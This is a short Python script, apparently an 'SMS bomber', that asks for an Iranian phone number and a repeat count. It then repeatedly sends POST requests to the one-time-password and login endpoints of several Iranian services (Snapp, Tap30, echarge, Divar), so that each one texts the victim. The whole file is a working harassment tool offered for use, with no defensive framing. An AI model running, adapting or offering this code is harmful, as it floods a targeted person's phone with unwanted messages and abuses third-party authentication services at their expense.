# Made by ali2004h

from urllib3 import PoolManager
from json import dumps
from time import sleep
from re import search


def main(c,num):

    if (search(r'9\d{9}$', num)):
        for time in range(c):
            print(f"\rSending sms {time+1}/{c}", end='')
            try:
                http = PoolManager()
                http.request("post", "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
                             headers={'Content-Type': 'application/json'},
                             body=dumps({"cellphone": f"+98{num}"}).encode())

                http.request("post", "https://tap33.me/api/v2/user",
                             headers={'Content-Type': 'application/json'},
                             body=dumps({"credential": {"phoneNumber": f"0{num}", "role": "PASSENGER"}}).encode())

                http.request("post", "https://www.echarge.ir/m/login?length=19",
                             headers={'Content-Type': 'application/json'},
                             body=dumps({"phoneNumber": f'0{num}'}).encode())

                http.request("post", "https://api.divar.ir/v5/auth/authenticate",
                             headers={'Content-Type': 'application/json'},
                             body=dumps({"phone": f'0{num}'}).encode())
                             
            except KeyboardInterrupt:
                exit()
            sleep(2)
        print('')
    else:
        print("error: invalid cellphone format, format: 9\d{9} e.g. 90157xxxx")


if (__name__ == "__main__"):
    main(num=input("Enter Phone Number : "), c=int(input("Enter Count Smss : ")))
